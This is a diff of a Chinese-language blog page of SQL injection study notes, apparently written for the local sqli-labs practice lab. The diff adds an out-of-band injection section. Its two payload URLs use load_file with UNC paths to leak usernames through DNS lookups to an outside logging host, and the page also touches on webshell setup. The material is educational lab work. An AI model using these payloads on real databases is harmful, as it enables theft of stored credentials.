@@ -200,7 +200,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>January 18, 2024</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>17211</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>17713</span>
     </div>
   </div>
 </section>
@@ -208,6 +208,7 @@
       <section class="content">
         
         <h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>​      December 20, 2023            17023    </p>
+<p>sql教程：<a target="_blank" rel="noopener" href="https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h#%20%E3%80%8Asql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B%E3%80%8B">https://www.yuque.com/sunwu-pbywz/iwogk6/fs49ainr05gsxb5h#%20%E3%80%8Asql%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B%E3%80%8B</a></p>
 <h2 id="sqli"><a href="#sqli" class="headerlink" title="sqli"></a>sqli</h2><p>建议在火狐浏览器中安装hackbar插件，可以更方便的编辑语句。</p>
 <p>谷歌浏览器官网：<a target="_blank" rel="noopener" href="https://www.google.com/chrome/">https://www.google.com/chrome/</a></p>
 <p>翻墙工具推荐：<a target="_blank" rel="noopener" href="https://console.xenolink.net/#/register?code=vocvktBL">https://console.xenolink.net/#/register?code=vocvktBL</a></p>
@@ -255,6 +256,9 @@
 <h4 id="uagent头注入"><a href="#uagent头注入" class="headerlink" title="uagent头注入"></a>uagent头注入</h4><p>通过连接增加插入语句的方式</p>
 <p><img    class="lazyload" data-original="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">img</span>两种方式</p>
 <h4 id="post注入"><a href="#post注入" class="headerlink" title="post注入"></a>post注入</h4><p>随便输入，再根据错误提示输入账号。这里就不赘述了</p>
+<h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-1/?id=1">http://127.0.0.1/sqli/Less-1/?id=1</a>‘ and if((select load_file(concat(‘\\‘, (select username from users where id&#x3D;1),’.28dabfb57fd8fc80.gobygo.net\abc’))),1,1)– -</p>
+<p><img    class="lazyload" data-original="https://raw.githubusercontent.com/20231201/123/main/image-20240222202617216.png" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg=="   ><span class="image-caption">image-20240222202617216</span></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/sqli/Less-1/?id=1">http://127.0.0.1/sqli/Less-1/?id=1</a>‘ and if((select load_file(concat(‘\\‘, (select substr((select group_concat(username) from users),1,5)),’.340b7010f18a2f20.gobygo.net\abc’))),1,1)– -</p>
 <h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><ol>
 <li><p>在phpstudy_pro\Extensions\MySQL5.7.26\my.ini文件中添加语句<code>secure_file_priv=&quot;&quot;</code></p>
 </li>
@@ -397,8 +401,8 @@
         
         
   <nav class="nav">
-    <a href="/2024/01/18/html%E5%9F%BA%E7%A1%80/"><i class="iconfont iconleft"></i>docker安装与html5基础</a>
-    <a href="/2024/01/18/linux%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%91%BD%E4%BB%A4/">linux文件结构及常见命令<i class="iconfont iconright"></i></a>
+    <a href="/2024/01/18/shell%EF%BC%8Cip%E7%AD%89/"><i class="iconfont iconleft"></i>网安基础知识（shell,ip,osi,vm联网,proxifer等）python基础</a>
+    <a href="/2024/01/18/%E5%89%8D%E5%90%8E%E7%AB%AF%E8%BF%9E%E6%8E%A5%E4%B8%8E/">前后端连接与php基础<i class="iconfont iconright"></i></a>
   </nav>
 
       </section>
